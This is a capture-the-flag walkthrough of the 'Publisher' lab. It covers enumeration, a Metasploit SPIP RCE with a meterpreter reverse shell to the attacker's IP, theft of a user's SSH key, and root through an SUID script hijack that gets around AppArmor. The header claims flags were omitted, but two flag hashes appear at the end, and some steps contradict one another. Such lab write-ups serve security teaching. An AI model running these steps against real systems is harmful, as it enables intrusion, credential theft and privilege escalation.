## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Test your enumeration skills on this boot-to-root machine.
The "**Publisher**" CTF machine is a simulated environment hosting some services. Through a series of enumeration techniques, including directory fuzzing and version identification, a vulnerability is discovered, allowing for Remote Code Execution (RCE). Attempts to escalate privileges using a custom binary are hindered by restricted access to critical system files and directories, necessitating a deeper exploration into the system's security profile to ultimately exploit a loophole that enables the execution of an unconfined bash shell and achieve privilege escalation.
```
### IP-Address
```IP-Address
10.49.132.103
```
### Enumeration
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 28:6b:ea:b1:a8:b9:22:00:9b:20:7f:f4:28:f3:43:66 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQrh1TmuqBi+RWag6sILHux54N97SFxrt5R89LjWDcpMKDuLFV0GRE2ITH6SBuzI200M80ngqPd/Qac5WAfz0DHYGVpxFvjm61d+YFASu34n6W0VXkYmlgfBCEXzCsOkd0YX9FpqhoN2Qu2jeBOtvzOkYVhOnnuiUR6Flf8Q1Ns+PLRCOJV5U0SFuZU0VYCO5ODonBFbZX50q2Z5EMa+g2nLPJl817duRgADipJzj5Kx5f2E5oCro9Fs1+qDq6JB5lvzl2xf0pNLH5ISn0S5MslLl2Jx1DUzyrRl4tK1CY60Z6VfymfMDQGOC3OWtJ8TWsVdO7ZZsM0k7Ta7tWkHSUXmFme0n3Vs7nwD88tne4NZaKMyvJlFkPpPv/oGAZfDEva0L7gn+ed5GEYBicQPiaV3EUxtapymCcpJFmWiJxGL1wKt3fOBG9LopEvAi1v8ZUf8cMTjUmRsqUrROpFKXhqHSHPh6vOjkH7lYPuZ4JAaC4Ka9gc9Ho2qM/tdUhkD0=
|   256 9d:4e:e1:59:72:5c:ce:88:e9:bc:3b:ca:54:e5:35:4b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM45IIj9BOhlkUkXfAFWY7nN8kvIUkyejXxGZ3MpW9ltPwqEN0c2GOHQo54ptHusj5U4a0kvcY5JEo488/AJKls=
|   256 6b:44:c5:e2:cc:74:74:6e:4a:14:f4:fc:1a:63:ba:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO+z3dskRkwMSdgbwi1ZGx3KPY98/2kJegC69ifwUkS3
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Publisher's Pulse: SPIP Insights & Tips
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
```
### Enumeration Using BURP
```bash
$ ffuf -u http://10.49.132.103/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt

.htaccess               
.htpasswd              
images                  
server-status          
spip                    301
:: Progress: [20481/20481] :: Job [1/1] :: 1129 req/sec :: Duration: [0:00:21] :: Errors: 0 ::

$ searchsploit spip 4.2

 Exploit Title                                                         
SPIP v4.2.0 - Remote Code Execution (Unauthenticated)                         | php/webapps/51536.py
```
- Got the `End-Point` on the `Web-App`and also `Exploit` already Available
- Source Code `view-source:http://10.49.132.103/spip/`
```html
<!DOCTYPE html>
<html dir="ltr" lang="fr" class="ltr fr no-js">
<head>
	<script type='text/javascript'>/*<![CDATA[*/(function(H){H.className=H.className.replace(/\bno-js\b/,'js')})(document.documentElement);/*]]>*/</script>
	<title>Publisher</title>
	
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />


<link rel="alternate" type="application/rss+xml" title="Syndiquer tout le site" href="spip.php?page=backend" />
<link rel='stylesheet' href='local/cache-css/d178ad2cae24a34af785965f3bc68e04.css?1777899024' type='text/css' />
<script type="text/javascript">/* <![CDATA[ */
var mediabox_settings={"auto_detect":true,"ns":"box","tt_img":true,"sel_g":"#documents_portfolio a[type='image\/jpeg'],#documents_portfolio a[type='image\/png'],#documents_portfolio a[type='image\/gif']","sel_c":".mediabox","str_ssStart":"Diaporama","str_ssStop":"Arr\u00eater","str_cur":"{current}\/{total}","str_prev":"Pr\u00e9c\u00e9dent","str_next":"Suivant","str_close":"Fermer","str_loading":"Chargement\u2026","str_petc":"Taper \u2019Echap\u2019 pour fermer","str_dialTitDef":"Boite de dialogue","str_dialTitMed":"Affichage d\u2019un media","splash_url":"","lity":{"skin":"_simple-dark","maxWidth":"90%","maxHeight":"90%","minWidth":"400px","minHeight":"","slideshow_speed":"2500","opacite":"0.9","defaultCaptionState":"expanded"}};
/* ]]> */</script>
```
- Got Another `End-Point` which is `/spip/spip.php?<function>`
- Functions Like `Search, Backend, etc`
- Find out the Exploit over `Metasploit`
```bash
msf exploit(multi/http/spip_rce_form) > use 0
[*] Using configured payload php/meterpreter/reverse_tcp
msf exploit(multi/http/spip_bigup_unauth_rce) > exploit
[-] Handler failed to bind to 192.168.157.252:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
[*] Exploit completed, but no session was created.
msf exploit(multi/http/spip_bigup_unauth_rce) > exploit
[*] Started reverse TCP handler on 192.168.157.252:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] SPIP Version detected: 4.2.0
[+] SPIP version 4.2.0 is vulnerable.
[*] Bigup plugin version detected: 3.2.1
[+] The target appears to be vulnerable. Both the detected SPIP version (4.2.0) and bigup version (3.2.1) are vulnerable.
[*] Found formulaire_action: login
[*] Found formulaire_action_args: CO9UtEY7t3ug2A/TPwoBV...
[*] Preparing to send exploit payload to the target...
[*] Sending stage (42137 bytes) to 10.49.132.103
[*] Meterpreter session 1 opened (192.168.157.252:4444 -> 10.49.132.103:34192) at 2026-05-05 18:37:50 -0400
```
- Got the Shell
```
meterpreter > ls
Listing: /home/think/spip/spip
==============================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100755/rwxr-xr-x  7045   fil   2023-12-20 14:05:25 -0500  CHANGELOG.md
040755/rwxr-xr-x  4096   dir   2023-12-20 14:05:15 -0500  IMG
100755/rwxr-xr-x  35147  fil   2023-12-20 14:05:25 -0500  LICENSE
100755/rwxr-xr-x  842    fil   2023-12-20 14:05:25 -0500  README.md
100755/rwxr-xr-x  178    fil   2023-12-20 14:05:25 -0500  SECURITY.md
100755/rwxr-xr-x  1761   fil   2023-12-20 14:05:25 -0500  composer.json
100755/rwxr-xr-x  27346  fil   2023-12-20 14:05:25 -0500  composer.lock
040755/rwxr-xr-x  4096   dir   2023-12-20 14:05:15 -0500  config
040755/rwxr-xr-x  4096   dir   2023-12-20 14:05:16 -0500  ecrire
100755/rwxr-xr-x  4307   fil   2023-12-20 14:05:25 -0500  htaccess.txt
100755/rwxr-xr-x  42     fil   2023-12-20 14:05:25 -0500  index.php
040755/rwxr-xr-x  4096   dir   2023-12-20 14:05:16 -0500  local
040755/rwxr-xr-x  4096   dir   2023-12-20 14:05:19 -0500  plugins-dist
100755/rwxr-xr-x  3645   fil   2023-12-20 14:05:25 -0500  plugins-dist.json
040755/rwxr-xr-x  4096   dir   2023-12-20 14:05:20 -0500  prive
100755/rwxr-xr-x  973    fil   2023-12-20 14:05:25 -0500  spip.php
100755/rwxr-xr-x  1212   fil   2023-12-20 14:05:25 -0500  spip.png
100755/rwxr-xr-x  1673   fil   2023-12-20 14:05:25 -0500  spip.svg
040755/rwxr-xr-x  4096   dir   2023-12-20 14:05:20 -0500  squelettes-dist
040755/rwxr-xr-x  4096   dir   2026-05-05 18:19:28 -0400  tmp
040755/rwxr-xr-x  4096   dir   2023-12-20 14:05:25 -0500  vendor

meterpreter > pwd
/home/think/spip/spip
meterpreter > cd /home/think
meterpreter > ls -la
Listing: /home/think
====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
020666/rw-rw-rw-  0     cha   2026-05-05 17:30:09 -0400  .bash_history
100644/rw-r--r--  220   fil   2023-11-14 03:57:26 -0500  .bash_logout
100644/rw-r--r--  3771  fil   2023-11-14 03:57:26 -0500  .bashrc
040700/rwx------  4096  dir   2023-11-14 03:57:24 -0500  .cache
040700/rwx------  4096  dir   2023-12-08 08:07:22 -0500  .config
040700/rwx------  4096  dir   2024-02-10 16:22:33 -0500  .gnupg
040775/rwxrwxr-x  4096  dir   2024-01-10 07:46:09 -0500  .local
100644/rw-r--r--  807   fil   2023-11-14 03:57:24 -0500  .profile
020666/rw-rw-rw-  0     cha   2026-05-05 17:30:09 -0400  .python_history
040755/rwxr-xr-x  4096  dir   2024-01-10 07:54:17 -0500  .ssh
020666/rw-rw-rw-  0     cha   2026-05-05 17:30:09 -0400  .viminfo
040750/rwxr-x---  4096  dir   2023-12-20 14:05:25 -0500  spip
100644/rw-r--r--  35    fil   2024-02-10 16:20:39 -0500  user.txt

meterpreter > cat user.txt
[flag/hash omitted]


meterpreter > cd .ssh
meterpreter > ls
Listing: /home/think/.ssh
=========================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  569   fil   2024-01-10 07:54:17 -0500  authorized_keys
100644/rw-r--r--  2602  fil   2024-01-10 07:48:14 -0500  id_rsa
100644/rw-r--r--  569   fil   2024-01-10 07:48:14 -0500  id_rsa.pub

meterpreter > cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
[private key omitted]
-----END OPENSSH PRIVATE KEY-----
```
- Use the `id_rsa` to login using `SSH`
```bash
think@ip-10-49-132-103:~$ whoami
think
think@ip-10-49-132-103:~$ id
uid=1000(think) gid=1000(think) groups=1000(think)
think@ip-10-49-132-103:/home/ubuntu$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd
/usr/sbin/run_container
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
```
- Got `SUID` of `run_container` 
```bash
think@ip-10-49-132-103:/$ file /usr/sbin/run_container
/usr/sbin/run_container: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=de92d7f1ac0088bfa52908d5945bfb4fd8fd390e, for GNU/Linux 3.2.0, not stripped

think@ip-10-49-132-103:/$ strings /usr/sbin/run_container
/lib64/ld-linux-x86-64.so.2
libc.so.6
__stack_chk_fail
execve
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
GLIBC_2.4
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
/bin/bash
/opt/run_container.sh
:*3$""
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8061
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
run_container.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
__stack_chk_fail@@GLIBC_2.4
__libc_start_main@@GLIBC_2.2.5
execve@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment

think@ip-10-49-132-103:/$ cat /opt/run_container.sh
#!/bin/bash

# Function to list Docker containers
list_containers() {
    if [ -z "$(docker ps -aq)" ]; then
	docker run -d --restart always -p 8000:8000 -v /home/think:/home/think 4b5aec41d6ef;
    fi
    echo "List of Docker containers:"
    docker ps -a --format "ID: {{.ID}} | Name: {{.Names}} | Status: {{.Status}}"
    echo ""
}

# Function to prompt user for container ID
prompt_container_id() {
    read -p "Enter the ID of the container or leave blank to create a new one: " container_id
    validate_container_id "$container_id"
}

# Function to display options and perform actions
select_action() {
    echo ""
    echo "OPTIONS:"
    local container_id="$1"
    PS3="Choose an action for a container: "
    options=("Start Container" "Stop Container" "Restart Container" "Create Container" "Quit")

    select opt in "${options[@]}"; do
        case $REPLY in
            1) docker start "$container_id"; break ;;
            2) 	if [ $(docker ps -q | wc -l) -lt 2 ]; then
	            echo "No enough containers are currently running."
    	            exit 1
		fi
                docker stop "$container_id"
                break ;;
            3) docker restart "$container_id"; break ;;
            4) echo "Creating a new container..."
               docker run -d --restart always -p 80:80 -v /home/think:/home/think spip-image:latest
               break ;;
            5) echo "Exiting..."; exit ;;
            *) echo "Invalid option. Please choose a valid option." ;;
        esac
    done
}

# Main script execution
list_containers
prompt_container_id  # Get the container ID from prompt_container_id function
select_action "$container_id"  # Pass the container ID to select_action function
think@ip-10-49-132-103:/$
```
- I Found out inside `run_container` there is also a reference of `/opt/run_container.sh`
```bash
think@ip-10-49-132-103:/$ ls -la /etc/apparmor.d
total 96
drwxr-xr-x   8 root root  4096 Apr 27  2025 .
drwxr-xr-x 132 root root 12288 May  5 21:29 ..
drwxr-xr-x   2 root root  4096 Apr 27  2025 abi
drwxr-xr-x   4 root root 12288 Apr 27  2025 abstractions
drwxr-xr-x   2 root root  4096 Feb 23  2022 disable
drwxr-xr-x   2 root root  4096 Feb 11  2020 force-complain
drwxr-xr-x   2 root root  4096 Apr 27  2025 local
-rw-r--r--   1 root root  1313 May 19  2020 lsb_release
-rw-r--r--   1 root root  1108 May 19  2020 nvidia_modprobe
-rw-r--r--   1 root root  3500 Jan 31  2023 sbin.dhclient
drwxr-xr-x   5 root root  4096 Apr 27  2025 tunables
-rw-r--r--   1 root root  1724 Sep  6  2024 ubuntu_pro_apt_news
-rw-r--r--   1 root root  6853 Sep  6  2024 ubuntu_pro_esm_cache
-rw-r--r--   1 root root  3202 Feb 25  2020 usr.bin.man
-rw-r--r--   1 root root   532 Feb 12  2024 usr.sbin.ash
-rw-r--r--   1 root root   672 Feb 19  2020 usr.sbin.ippusbxd
-rw-r--r--   1 root root  2006 Jun 14  2023 usr.sbin.mysqld
-rw-r--r--   1 root root  1575 Feb 11  2020 usr.sbin.rsyslogd
-rw-r--r--   1 root root  1674 Feb  8  2024 usr.sbin.tcpdump
think@ip-10-49-132-103:/$ cat /etc/apparmor.d/usr.sbin.ash
#include <tunables/global>
/usr/sbin/ash flags=(complain) {
  #include <abstractions/base>
  #include <abstractions/bash>
  #include <abstractions/consoles>
  #include <abstractions/nameservice>
  #include <abstractions/user-tmp>

  # Remove specific file path rules
  # Deny access to certain directories
  deny /opt/ r,
  deny /opt/** w,
  deny /tmp/** w,
  deny /dev/shm w,
  deny /var/tmp w,
  deny /home/** w,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,

  # Simplified rule for accessing /home directory
  owner /home/** rix,
}
```
- I Found out I cant write inside any of these 
```bash
- /home
- /tmp
- /opt
- /usr/bin
- /usr/sbin

what actually didn''t work because of '/' not at the end /var/tmp   and  /dev/shm
```
- We can write `/dev/shm` & `/var/tmp`
```bash
think@ip-10-49-132-103:/var/tmp$ echo '#!/bin/bash' > docker
think@ip-10-49-132-103:/var/tmp$ chmod +x docker
think@ip-10-49-132-103:/var/tmp$ export PATH=/var/tmp:$PATH
think@ip-10-49-132-103:/var/tmp$ which docker
/var/tmp/docker
think@ip-10-49-132-103:/var/tmp$ /opt/run_container.sh
think@ip-10-49-132-103:/var/tmp$ echo $0
think@ip-10-49-132-103:/var/tmp$ $PATH
bash: /var/tmp:/var/tmp/:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:
```
- Let's Execute the Path injection
```bash
think@ip-10-49-132-103:/var/tmp$ cp docker /opt/run_container.sh
think@ip-10-49-132-103:/var/tmp$ /usr/sbin/run_container
bash-5.0# whoami
bash-5.0# cat /root/root.txt
bash-5.0# ls
bash-5.0# exit
exit
think@ip-10-49-132-103:/var/tmp$ exit
exit
List of Docker containers:
think@ip-10-49-132-103:/var/tmp$ /usr/sbin/run_container
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
[flag/hash omitted]
```
#### Flag
```Flags
User - fa229046d44eda6a3598c73ad96f4ca5
Root - 3a4225cc9e85709adda6ef55d6a4f2ca
```
# END